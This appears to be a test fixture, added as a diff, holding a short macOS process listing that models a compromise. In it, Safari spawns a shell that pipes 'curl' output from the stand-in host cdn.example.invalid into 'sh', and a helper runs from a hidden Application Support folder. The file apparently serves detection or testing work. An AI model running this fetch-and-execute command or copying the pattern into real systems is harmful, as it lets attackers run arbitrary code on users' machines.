@@ -1,0 +1,5 @@
+  PID  PPID   UID USER     %CPU %MEM STARTED       TTY STAT COMMAND
+    1     0     0 root      0.0  0.1 Thu Sep 11  ??  Ss  /sbin/launchd
+  400     1   501 alice     1.0  2.0 Thu Sep 11  ??  S   /Applications/Safari.app/Contents/MacOS/Safari
+  501   400   501 alice     0.0  0.1 Thu Sep 11 ttys000 S /bin/zsh -c curl -sL http://cdn.example.invalid/u.sh | sh
+  700     1   501 alice     0.3  0.4 Thu Sep 11  ??  S   /Users/alice/Library/Application Support/.hlpr/helper
